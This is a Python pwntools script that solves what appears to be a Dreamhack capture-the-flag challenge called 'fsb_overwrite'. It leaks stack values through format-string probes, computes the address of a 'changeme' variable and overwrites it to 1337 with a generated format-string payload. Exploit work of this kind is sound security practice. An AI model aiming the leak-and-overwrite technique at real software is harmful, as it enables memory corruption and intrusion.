#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./fsb_overwrite")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 11495)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def dump():
    dump = ""
    for i in range(193):
        print(i)
        io = connect()
        payload = f"AAAAAAAA#%{i}$lx#"
        io.sendline(payload.encode())
        io.recvuntil("#")
        leak = io.recvuntil("#").strip(b"#").decode()
        dump += f"{i}: 0x{leak}\n"
        io.close()

    with open("./dump.txt", "w") as file:
        file.write(dump)


def main():
    io = connect()

    io.sendline(b"#%15$lx#")
    io.recvuntil(b"#")
    changeme = int(io.recvuntil(b"#").strip(b"#"), 16) + 0x2D89
    ptr.logger.info(f"changeme: {hex(changeme)}")

    payload = pwn.fmtstr_payload(6, {changeme: 1337}, write_size="int")
    ptr.logger.info(f"payload: {payload}")
    ptr.logger.info(f"length: {len(payload)}")
    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    # dump()
    main()
